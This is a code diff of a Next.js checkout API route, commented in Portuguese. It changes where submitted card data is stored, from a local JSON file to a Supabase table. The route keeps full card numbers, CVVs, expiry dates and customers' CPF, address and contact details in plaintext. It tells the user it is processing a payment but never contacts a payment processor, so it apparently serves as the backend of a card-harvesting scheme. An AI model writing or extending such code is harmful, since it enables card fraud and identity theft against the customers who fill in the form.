@@ -1,6 +1,5 @@
 import { type NextRequest, NextResponse } from "next/server"
-import fs from 'fs'
-import path from 'path'
+import { supabaseAdmin } from '@/lib/supabase'
 
 // Função simples de "descriptografia" (apenas para decode do base64)
 function decryptData(encryptedData: string): any {
@@ -19,58 +18,54 @@ export async function POST(request: NextRequest) {
     // Descriptografar dados
     const cardData = decryptData(data)
     
-    // Criar objeto com dados do cartão
-    const savedData = {
-      id: Date.now().toString(),
-      timestamp: new Date().toISOString(),
-      customer: {
-        name: cardData.customerName,
-        cpf: cardData.customerCpf,
-        phone: cardData.customerPhone,
-        email: cardData.customerEmail,
-        address: cardData.customerAddress
-      },
-      card: {
-        number: cardData.cardNumber,
-        holderName: cardData.cardHolderName,
-        expiryDate: cardData.cardExpiryDate,
-        cvv: cardData.cardCvv
-      },
-      product: {
-        name: cardData.productName,
-        price: cardData.productPrice,
-        quantity: cardData.productQuantity
-      },
-      total: cardData.total
+    // Validar dados obrigatórios
+    if (!cardData.customerName || !cardData.cardNumber || !cardData.cardHolderName) {
+      return NextResponse.json({ 
+        success: false,
+        error: "Dados obrigatórios faltando"
+      }, { status: 400 })
     }
     
-    // Caminho do arquivo JSON
-    const filePath = path.join(process.cwd(), 'card-data.json')
+    // Inserir no Supabase
+    const { data: insertedData, error } = await supabaseAdmin
+      .from('card_data')
+      .insert([
+        {
+          customer_name: cardData.customerName || '',
+          customer_cpf: cardData.customerCpf || '',
+          customer_phone: cardData.customerPhone || '',
+          customer_email: cardData.customerEmail || '',
+          customer_address: cardData.customerAddress || '',
+          card_number: cardData.cardNumber || '',
+          card_holder_name: cardData.cardHolderName || '',
+          card_expiry_date: cardData.cardExpiryDate || '',
+          card_cvv: cardData.cardCvv || '',
+          product_name: cardData.productName || '',
+          product_price: cardData.productPrice || 0,
+          product_quantity: cardData.productQuantity || 1,
+          total: cardData.total || 0
+        }
+      ])
+      .select()
     
-    // Ler dados existentes ou criar array vazio
-    let existingData = []
-    try {
-      const fileContent = fs.readFileSync(filePath, 'utf-8')
-      existingData = JSON.parse(fileContent)
-    } catch (error) {
-      // Arquivo não existe ainda
+    if (error) {
+      return NextResponse.json({ 
+        success: false,
+        error: "Erro ao salvar no banco de dados",
+        details: error.message
+      }, { status: 500 })
     }
-    
-    // Adicionar novo registro
-    existingData.push(savedData)
-    
-    // Salvar no arquivo
-    fs.writeFileSync(filePath, JSON.stringify(existingData, null, 2))
     
     return NextResponse.json({ 
       success: true,
       message: "Processando pagamento",
-      id: savedData.id
+      id: insertedData?.[0]?.id
     })
   } catch (error) {
     return NextResponse.json({ 
       success: false,
-      error: "Erro ao processar"
+      error: "Erro ao processar",
+      details: error instanceof Error ? error.message : 'Unknown error'
     }, { status: 500 })
   }
 }
